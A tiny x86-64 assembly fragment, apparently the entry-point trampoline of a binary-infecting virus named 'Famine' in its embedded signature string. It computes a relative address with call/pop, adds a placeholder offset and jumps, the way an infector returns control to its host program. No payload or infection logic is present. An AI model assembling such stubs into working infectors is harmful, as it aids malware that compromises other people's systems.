BITS 64

call next
next:
    pop rax
    mov rbx, 0xDEADBEEFDEADBEEF
    add rax, rbx
    jmp rax    
    db "Famine version 1.0 (c)oded by ialgac-beeligul", 0
